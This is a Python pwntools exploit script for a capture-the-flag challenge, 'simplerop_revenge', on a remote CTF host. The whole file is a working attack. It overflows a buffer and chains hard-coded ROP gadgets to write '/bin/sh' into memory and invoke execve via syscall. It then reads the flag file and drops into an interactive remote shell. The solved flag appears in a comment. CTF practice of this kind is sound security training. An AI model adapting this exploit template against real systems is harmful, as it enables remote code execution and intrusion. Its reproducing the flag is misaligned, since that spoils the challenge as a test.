#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{TAKEMY_REVENGE}

context.arch = 'amd64'

e = ELF('./simplerop_revenge-a94df6520a6dbe478b5a03fd31e0b0614bcdf08d')

host , port = 'csie.ctf.tw' , 10130

y = remote(host,port)

pop_rdi = 0x401456
ppr = 0x442809 # rdx , rsi
pppr = 0x478516 # rax , rdx , rbx
push_rsp = 0x41bd4a
push_rdi = 0x42f8ee
mov_rdi_rsi = 0x47a502
syscall = 0x4671b5

p = flat(
    'D' * 0x28,
    ppr,
    0,
    '/bin/sh\x00',
    pop_rdi,
    e.bss(),
    mov_rdi_rsi,
    ppr,
    0,
    0,
    pppr,
    0x3b,
    0,
    0,
    syscall
)

y.sendafter( ':' , p )

sleep(0.7)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

